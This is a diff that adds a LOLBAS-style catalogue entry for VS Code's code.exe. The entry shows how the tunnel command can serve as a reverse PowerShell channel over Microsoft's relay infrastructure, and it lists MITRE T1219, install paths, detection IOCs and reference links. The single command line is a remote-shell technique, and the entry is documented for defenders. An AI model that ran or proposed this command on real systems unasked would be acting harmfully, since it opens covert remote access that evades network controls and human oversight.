@@ -1,0 +1,25 @@
+---
+Name: code.exe
+Description: VSCode binary, also portable (CLI) version
+Author: PfiatDe
+Created: 2023-02-01
+Commands:
+  - Command: code.exe tunnel --accept-server-license-terms --name "tunnel-name"
+    Description: Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command
+    Usecase: Reverse PowerShell session over MS provided infrastructure.
+    Category: Execute
+    Privileges: User
+    MitreID: T1219
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: '%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe'
+  - Path: C:\Program Files\Microsoft VS Code\Code.exe
+  - Path: C:\Program Files (x86)\Microsoft VS Code\Code.exe
+Detection:
+  - IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
+  - IOC: 'Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe'
+  - IOC: 'File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json'
+Resources:
+  - Link: https://badoption.eu/blog/2023/01/31/code_c2.html
+  - Link: https://code.visualstudio.com/docs/remote/tunnels
+  - Link: https://code.visualstudio.com/blogs/2022/12/07/remote-even-better
